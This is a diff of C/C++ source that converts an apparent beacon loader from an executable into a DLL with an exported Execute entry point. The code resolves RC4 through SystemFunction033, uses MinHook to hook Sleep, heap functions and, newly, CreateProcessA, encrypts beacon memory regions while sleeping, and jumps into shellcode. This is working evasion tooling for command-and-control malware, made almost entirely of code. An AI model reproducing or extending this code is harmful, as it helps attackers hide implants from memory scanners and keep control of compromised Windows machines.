@@ -1,12 +1,13 @@
 #include "header.h"
 
+
 fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");
 fnHeapCreate g_HeapCreate = (fnHeapCreate)GetProcAddress(GetModuleHandleA("kernel32.dll"), "HeapCreate");
 fnGetProcessHeap g_GetProcessHeap = (fnGetProcessHeap)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcessHeap");
 fnCreateProcessA g_CreateProcessA = (fnCreateProcessA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
 fnSleep g_Sleep = (fnSleep)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
 
-int main()
+extern "C" __declspec(dllexport) VOID Execute()
 
 {
     g_dwBeaconBlocks = 0;
@@ -21,15 +22,34 @@ int main()
     MH_Initialize();
     MH_CreateHook((PBYTE)&Sleep, &MySleep, (LPVOID*)&g_Sleep);
     MH_CreateHook((PBYTE)&HeapCreate, &MyHeapCreate, (LPVOID*)&g_HeapCreate);
+    MH_CreateHook((PBYTE)&CreateProcessA, &MyCreateProcessA, (LPVOID*)&g_CreateProcessA);
     MH_CreateHook((PBYTE)&GetProcessHeap, &MyGetProcessHeap, (LPVOID*)&g_GetProcessHeap);
     MH_EnableHook((PBYTE)&GetProcessHeap);
     MH_EnableHook((PBYTE)&HeapCreate);
     MH_EnableHook((PBYTE)&Sleep);
+    MH_EnableHook((PBYTE)&CreateProcessA);
 
 
     ((void(*)(void)) g_ShellcodeAddr)();
 
-    return 0;
+}
+
+
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved
+)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
 }
 
 VOID RandomGen()
@@ -103,7 +123,7 @@ VOID BeaconEncrypt(BOOL fEncrypt) {
             }
             else
             {
-                
+
                 orgs[g_dwBeaconBlocks].BaseAddress = mbi.BaseAddress;
                 orgs[g_dwBeaconBlocks].RegionSize = mbi.RegionSize;
                 orgs[g_dwBeaconBlocks].Protect = mbi.Protect;
@@ -146,7 +166,7 @@ VOID WINAPI MySleep(DWORD SleepTime) {
 
     //MH_DisableHook((PBYTE)&Sleep);
 
-    SecureZeroMemory(&mbi,sizeof(mbi));
+    SecureZeroMemory(&mbi, sizeof(mbi));
 
     VirtualQuery((LPCVOID)origReturnAddress, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
     g_BeaconAddr = mbi.AllocationBase;
